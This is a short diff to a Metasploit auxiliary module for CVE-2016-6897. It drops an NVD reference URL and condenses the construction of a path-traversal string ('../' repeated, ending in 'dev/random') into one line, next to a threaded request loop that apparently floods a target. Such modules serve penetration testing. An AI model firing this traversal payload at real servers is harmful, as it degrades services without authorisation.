@@ -27,8 +27,7 @@ class MetasploitModule < Msf::Auxiliary
         [
           ['CVE', '2016-6897'],
           ['EDB', '40288'],
-          ['OVEID', 'OVE-20160712-0036'],
-          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2016-6897']
+          ['OVEID', 'OVE-20160712-0036']
         ],
     ))
 
@@ -127,11 +126,7 @@ class MetasploitModule < Msf::Auxiliary
         return
       end
 
-      path = '/'
-      1.upto(depth) do |i|
-          path += '../'
-      end
-      path += 'dev/random'
+      path = "/#{'../' * depth}dev/random"
 
       while starting_thread < rlimit do
         ubound = [rlimit - (starting_thread - 1), thread_count].min
